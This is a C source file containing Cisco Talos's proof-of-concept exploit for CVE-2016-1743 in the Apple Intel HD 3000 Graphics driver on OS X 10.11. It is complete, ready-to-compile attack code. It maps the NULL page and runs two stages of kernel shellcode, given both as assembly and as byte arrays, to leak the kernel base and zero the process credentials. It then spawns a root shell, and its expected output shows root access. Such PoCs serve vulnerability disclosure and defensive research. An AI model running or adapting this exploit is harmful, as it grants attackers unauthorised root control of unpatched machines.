/*

░▀█▀░█▀█░█░░░█▀█░█▀▀░░░█░█░█░█░█░░░█▀█░█▀▄░█▀▀░█░█░
░░█░░█▀█░█░░░█░█░▀▀█░░░▀▄▀░█░█░█░░░█░█░█░█░█▀▀░▀▄▀░
░░▀░░▀░▀░▀▀▀░▀▀▀░▀▀▀░░░░▀░░▀▀▀░▀▀▀░▀░▀░▀▀░░▀▀▀░░▀░░
  T   A   L   O   S     V   U   L   N   D   E   V

Proof-of-Concept Exploit
Advisory: http://www.talosintel.com/reports/TALOS-2016-0088/
Snort rules: 37517, 37518
CVE-2016-1743

Author: Piotr Bania, Cisco Talos
Target: Apple Intel HD 3000 Graphics driver 
Impact: Local Privilege Escalation (root)

Tested Configuration: 
Apple Intel HD 3000 Graphics driver 10.0.0
Darwin Kernel Version 15.2.0
OSX 10.11.2

Compilation: 
gcc TALOS-2016-0088_poc.c lsym.m -o TALOS-2016-0088_poc -framework IOKit -framework Foundation -m32 -Wl,-pagezero_size,0 -O3

kudos: 
qwertyoruiop (i've grabbed the lsym thing from you)


technical information (AppleIntelHD3000Graphics driver 10.0.0) :
...
__text:000000000001AA4E                 mov     ecx, [rcx]
__text:000000000001AA50                 add     ecx, ecx
__text:000000000001AA52                 sub     eax, ecx
__text:000000000001AA54                 cmp     rbx, rax
__text:000000000001AA57                 ja      loc_1AC8C
__text:000000000001AA5D                 mov     [rbp+var_54], esi
__text:000000000001AA60                 mov     rax, [rdi]
__text:000000000001AA63                 mov     esi, 168h
__text:000000000001AA68                 call    qword ptr [rax+980h]         ; # WE CAN CONTROL THIS #


Expected output:

mac-mini:bug mini$ uname -a
Darwin BLAs-Mac-mini 15.2.0 Darwin Kernel Version 15.2.0: Fri Nov 13 19:56:56 PST 2015; root:xnu-3248.20.55~2/RELEASE_X86_64 x86_64

mac-mini:bug mini$ ./TALOS-2016-0088_poc
---------------------------------------------------------------- 
APPLE MAC MINI AppleIntelHD3000Graphics EXPLOIT OSX 10.11 
by Piotr Bania / CISCO TALOS
---------------------------------------------------------------- 


Alloc: deallocating! 
Alloc: allocating 0x2000 (0x00000000 - 0x00002000)bytes
Alloc: vm_allocate ok, now vm_protect ...
Alloc: vm_allocate returned = 0 - addr = 0x00000000, vm_protect ok, filling
Mapping the kernel 
MapKernel: kernel mapped 
Initializing service 
InitService: Trying: Gen6Accelerator 
InitService: service ok! 
Commencing stage 1 
Stage1: Copying the stage1 payload 0x00001000 - 0x00001071 
Stage1: Setting up the RIP to 0x00001000 
Stage1: Copying trigger data 
Stage1: Making stage1 call
Stage1: leaked kernel address 0xffffff8021e00000 
Stage1: kernel address leaked, success! 
ResolveApi: using kernel addr 0xffffff8021e00000 (file base = 0xffffff8000200000) 
ResolveApi: _current_proc = 0xffffff8022437a60  
ResolveApi: _proc_ucred = 0xffffff80223a9af0  
ResolveApi: _posix_cred_get = 0xffffff802237e780  
ResolveApi: _chgproccnt = 0xffffff80223a8400  
Commencing stage 2 
Stage2: preparing the stage2 payload 
Stage2: Copying the stage2 payload 0x00001000 - 0x00001071 
Stage2: Setting up the RIP to 0x00001000 
Stage2: Copying trigger data 
Stage2: Making stage2 call
Stage2: success, got root! 
Stage2: now executing shell 
sh-3.2# whoami
root
sh-3.2# 

*/


#include "import.h"

/**

    defines

**/

#define MEM_SIZE                        0x2000
#define PAYLOAD_MEM_START               0x1000
#define INIT_SIG                        0x0210010100000008
#define OFFSET_PAYLOAD_EXEC             0x980
#define OFFSET_ROOM                     64

#define RESOLVE_SYMBOL_MY(map, name)    lsym_find_symbol(map, name) - base + KernelAddr


/**

    stage 1 payload - get kernel address and put it to 0x1000

 ; memory space for kernel address 
 
 nop
 nop
 nop
 nop
 nop
 nop
 nop
 nop
 
 save_regs64
 
 
    ; get msr entry
    mov     rcx, 0C0000082h     ;   lstar
    rdmsr				        ;   MSR[ecx] --> edx:eax
    shl     rdx, 32
    or	    rax, rdx
      
    ; find kernel addr - scan backwards
MAX_KERNEL_SCAN_SIZE    equ 10000h    
KERNEL_SIG              equ 01000007FEEDFACFh
PAGE_SIZE               equ 1000h    
    
    
    mov     rcx, MAX_KERNEL_SCAN_SIZE
    and     rax, not 0FFFFFh
    xor     rdx, rdx
    mov     r8, KERNEL_SIG
    
 
scan_loop:
    sub     rax, PAGE_SIZE
    dec     rcx
    jz      scan_done

    ; is sig correct?
    cmp     qword [rax], r8
    jnz     scan_loop
    
    mov     rdx, rax
    
scan_done:    
    
    ; store the addr - rdx kernel addr, 0 if not found
    lea     rcx, [shell_start]
    mov     qword [rcx], rdx
 
 load_regs64
 
    xor     rax, rax
    xor     r15, r15
    
    ret
     
    
    
**/

unsigned char stage1[113] = {
	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x53, 0x55, 0x57, 0x56, 0x41, 0x54, 0x41, 0x55, 
	0x41, 0x56, 0x41, 0x57, 0x48, 0xB9, 0x82, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x32, 
	0x48, 0xC1, 0xE2, 0x20, 0x48, 0x09, 0xD0, 0x48, 0xC7, 0xC1, 0x00, 0x00, 0x01, 0x00, 0x48, 0x25, 
	0x00, 0x00, 0xF0, 0xFF, 0x48, 0x31, 0xD2, 0x49, 0xB8, 0xCF, 0xFA, 0xED, 0xFE, 0x07, 0x00, 0x00, 
	0x01, 0x48, 0x2D, 0x00, 0x10, 0x00, 0x00, 0x48, 0xFF, 0xC9, 0x74, 0x08, 0x4C, 0x39, 0x00, 0x75, 
	0xF0, 0x48, 0x89, 0xC2, 0x48, 0x8D, 0x0D, 0xA5, 0xFF, 0xFF, 0xFF, 0x48, 0x89, 0x11, 0x41, 0x5F, 
	0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5E, 0x5F, 0x5D, 0x5B, 0x48, 0x31, 0xC0, 0x4D, 0x31, 0xFF, 
	0xC3
};


/**

    stage 2 payload - escalate

  jmp over_api_table
 
 
    api_current_proc    dq   0
    api_proc_ucred      dq   0
    api_posix_cred_get  dq   0
    api_chgproccnt      dq   0
 
 
 
 over_api_table:
 save_regs64   
    
       mov     rax, qword [api_current_proc]
    call    rax
    mov     rdi, rax        ; rdi = cur_proc
    
    
    ; system v abi - rdi first arg
    mov     rax, qword [api_proc_ucred]
    call    rax
    
    
    ; rax = cur_ucred
    mov     rdi, rax
    mov     rax, qword [api_posix_cred_get]
    call    rax
    
    ; rax = pcred
    mov     dword [rax], 0
    mov     dword [rax+8], 0
    
 load_regs64
 
    xor     rax, rax
    xor     r15, r15
    
    ret
    
**/


#define     OFF_API_START               2                   
#define     OFF_API_CURRENT_PROC        OFF_API_START
#define     OFF_API_PROC_UCRED          OFF_API_CURRENT_PROC    + 8
#define     OFF_API_POSIX_CRED_GET      OFF_API_PROC_UCRED      + 8
#define     OFF_API_CHGPROCCNT          OFF_API_POSIX_CRED_GET  + 8     // not used in this example


unsigned char stage2[111] = {
	0xEB, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x53, 0x55, 0x57, 0x56, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8B, 
	0x05, 0xCD, 0xFF, 0xFF, 0xFF, 0xFF, 0xD0, 0x48, 0x89, 0xC7, 0x48, 0x8B, 0x05, 0xC9, 0xFF, 0xFF, 
	0xFF, 0xFF, 0xD0, 0x48, 0x89, 0xC7, 0x48, 0x8B, 0x05, 0xC5, 0xFF, 0xFF, 0xFF, 0xFF, 0xD0, 0xC7, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x40, 0x08, 0x00, 0x00, 0x00, 0x00, 0x41, 0x5F, 0x41, 0x5E, 
	0x41, 0x5D, 0x41, 0x5C, 0x5E, 0x5F, 0x5D, 0x5B, 0x48, 0x31, 0xC0, 0x4D, 0x31, 0xFF, 0xC3
};



/**

    globals
    
**/

uint64_t                mem;
io_connect_t            conn;

uint64_t                KernelAddr          =   0;
lsym_map_t*             MappingKernel       =   0;

uint64_t                api_current_proc    =   0;
uint64_t                api_proc_ucred      =   0;
uint64_t                api_posix_cred_get  =   0;
uint64_t                api_chgproccnt      =   0;
 
 


/**

    functions
    
**/



uint64_t Alloc(uint32_t addr, uint32_t sz) 
{
    mach_error_t	k_error;
    
    printf("Alloc: deallocating! \n");
    vm_deallocate(mach_task_self(), (vm_address_t) addr, sz);
    
    printf("Alloc: allocating 0x%x (0x%08x - 0x%08x) bytes\n", sz, addr, addr+sz);
    k_error = vm_allocate(mach_task_self(), (vm_address_t*)&addr, sz, 0);
    
    if (k_error != KERN_SUCCESS)
    {
         printf("Alloc: vm_allocate() - failed with message %s (error = %d)!\n", mach_error_string(k_error), k_error);
         exit(-1);
    }
    
    
    printf("Alloc: vm_allocate ok, now vm_protect ...\n");
 
    k_error =  vm_protect(mach_task_self(), addr, sz, 0, 7); //rwx
       
    if (k_error != KERN_SUCCESS)
    {
         printf("Alloc: vm_protect() - failed with message %s (error = %d)!\n", mach_error_string(k_error), k_error);
         exit(-1);        
    }
     
    printf("Alloc: vm_allocate returned = %d - addr = 0x%08x, vm_protect ok, filling\n", k_error, addr);
   
    while(sz--) *(char*)(addr+sz)=0;
    return addr;
}


int MapKernel(void)
{
    
    MappingKernel   =   lsym_map_file("/mach_kernel");
    if (!MappingKernel || !MappingKernel->map) 
    {
        MappingKernel  =   lsym_map_file("/System/Library/Kernels/kernel");
    }
    
    if (!MappingKernel || !MappingKernel->map) 
    {
        printf("MapKernel: unable to map kernel, quiting \n");
        return -1;
    }
    
    
    printf("MapKernel: kernel mapped \n");
    return 1;
}



int ResolveApi(void)
{
    
 
    uint64_t        base                =   lsym_kernel_base(MappingKernel);
      
    api_current_proc    =   RESOLVE_SYMBOL_MY(MappingKernel, "_current_proc");
    api_proc_ucred      =   RESOLVE_SYMBOL_MY(MappingKernel, "_proc_ucred");   
    api_posix_cred_get  =   RESOLVE_SYMBOL_MY(MappingKernel, "_posix_cred_get");
    api_chgproccnt      =   RESOLVE_SYMBOL_MY(MappingKernel, "_chgproccnt");
  
    printf("ResolveApi: using kernel addr 0x%016llx (file base = 0x%016llx) \n", KernelAddr, base);
    printf("ResolveApi: _current_proc = 0x%016llx  \n", api_current_proc);
    printf("ResolveApi: _proc_ucred = 0x%016llx  \n", api_proc_ucred);
    printf("ResolveApi: _posix_cred_get = 0x%016llx  \n", api_posix_cred_get);
    printf("ResolveApi: _chgproccnt = 0x%016llx  \n", api_chgproccnt);
       
    return 1;
    
}




int InitService(char *IoServiceName)
{
    int                     type;
    io_service_t            service;
    CFMutableDictionaryRef  matching;
    io_iterator_t           iterator;    
    
    printf("InitService: Trying: %s \n", IoServiceName);
    
    matching = IOServiceMatching(IoServiceName);
    
    if( !matching) 
    {
        printf("Initservice: IOServiceMatching() failed \n");
        return -1;
    }
    
    if (IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator) != KERN_SUCCESS) 
    {
        printf("InitService: IOServiceGetMatchingServices failed \n");
        return -1;
    }

   
    service = IOIteratorNext(iterator);
    if (service == IO_OBJECT_NULL) 
    {
        printf("InitService: IOIteratorNext failed \n");
        return -1;
    }
    
    
    type        =   0;
    conn        =   MACH_PORT_NULL;
    if (IOServiceOpen(service, mach_task_self(), 5, &conn) != KERN_SUCCESS) 
    {
        printf("InitService: IOServiceOpen failed! \n");
        return -1;
    }
   
    printf("InitService: service ok! \n");
    return 1;
}



int Stage1(void)
{
    unsigned    char        *p;
    unsigned    char        *p_ptr;
    
    kern_return_t           k_error;

    char                    UselessStruct[4096];
    size_t                  UselessStructSize = 0x14; 
        
    
    p                   = (unsigned char*)mem; 
    p_ptr               = p + OFFSET_ROOM;
    
    
    
    printf("Stage1: Copying the stage1 payload 0x%08x - 0x%08lx \n", PAYLOAD_MEM_START, PAYLOAD_MEM_START + sizeof(stage1));
    memcpy((void*)(p + PAYLOAD_MEM_START), (void*)&stage1, sizeof(stage1));

    printf("Stage1: Setting up the RIP to 0x%08x \n", PAYLOAD_MEM_START);
    *(uint64_t*)(p + OFFSET_PAYLOAD_EXEC) = PAYLOAD_MEM_START;
    
    
    printf("Stage1: Copying trigger data \n");
    *(uint64_t*)p_ptr    =   INIT_SIG;
    
    printf("Stage1: Making stage1 call\n");    
    k_error = IOConnectCallMethod(conn, 0x5, 0, 0, p_ptr, 0x8c, 0, 0, &UselessStruct, &UselessStructSize); 
   
    KernelAddr      =   *(uint64_t*)PAYLOAD_MEM_START;
    printf("Stage1: leaked kernel address 0x%016llx \n", KernelAddr);
    
    if ((KernelAddr == 0) || (KernelAddr == 0x90909090)) 
    {
        printf("Stage1: fatal kernel address is wrong, exiting \n");
        return -1;
    }
    
    printf("Stage1: kernel address leaked, success! \n");
    return 1;
}


int Stage2(void)
{
    int         i;
    unsigned    char        *p;
    unsigned    char        *p_ptr;
    
    kern_return_t           k_error;

    char                    UselessStruct[4096];
    size_t                  UselessStructSize = 0x14; 
        
    
    p                   = (unsigned char*)mem; 
    p_ptr               = p + OFFSET_ROOM;
    
    
    printf("Stage2: preparing the stage2 payload \n");

    unsigned char *t                            =   (unsigned char*)&stage2;
    *(uint64_t*)(t + OFF_API_CURRENT_PROC)      =   api_current_proc;
    *(uint64_t*)(t + OFF_API_PROC_UCRED)        =   api_proc_ucred;
    *(uint64_t*)(t + OFF_API_POSIX_CRED_GET)    =   api_posix_cred_get;
    *(uint64_t*)(t + OFF_API_CHGPROCCNT)        =   api_chgproccnt;
   
    
    printf("Stage2: Copying the stage2 payload 0x%08x - 0x%08lx \n", PAYLOAD_MEM_START, PAYLOAD_MEM_START + sizeof(stage1));
    memcpy((void*)(p + PAYLOAD_MEM_START), (void*)&stage2, sizeof(stage2));

    printf("Stage2: Setting up the RIP to 0x%08x \n", PAYLOAD_MEM_START);
    *(uint64_t*)(p + OFFSET_PAYLOAD_EXEC) = PAYLOAD_MEM_START;
    
   
    printf("Stage2: Copying trigger data \n");
    *(uint64_t*)p_ptr    =   INIT_SIG;
    
 
    printf("Stage2: Making stage2 call\n");    
    k_error = IOConnectCallMethod(conn, 0x5, 0, 0, p_ptr, 0x8c, 0, 0, &UselessStruct, &UselessStructSize); 
   
    
    setuid(0);
    if (getuid() == 0) 
    {
        
        printf("Stage2: success, got root! \n");
        printf("Stage2: now executing shell \n");
  
        system("/bin/sh");
        exit(0);
    }
    
    
    printf("Stage2: failed! \n");
    return -1;    

}




int main(void)
{
    printf(" ---------------------------------------------------------------- \n");
    printf(" APPLE MAC MINI AppleIntelHD3000Graphics EXPLOIT OSX 10.11 \n"); 
    printf(" by Piotr Bania / CISCO TALOS \n");
    printf(" ---------------------------------------------------------------- \n\n\n");
    
    
    IOServiceClose(0);                      
    IOServiceOpen(0, 0, 0, 0);                 
    
    // if this fails and we are done 
    mem = Alloc(0, MEM_SIZE);
    
    
    printf("Mapping the kernel \n");
    
    if (MapKernel() == -1)
        return -1;
 
    printf("Initializing service \n");
    
    if (InitService("Gen6Accelerator") == -1)
        return -1;
    
    printf("Commencing stage 1 \n");
    
    if (Stage1() == -1)
        return -1;

    if (ResolveApi() == -1)
        return -1;

    printf("Commencing stage 2 \n");
     
    Stage2();
 
 
    return 1;
}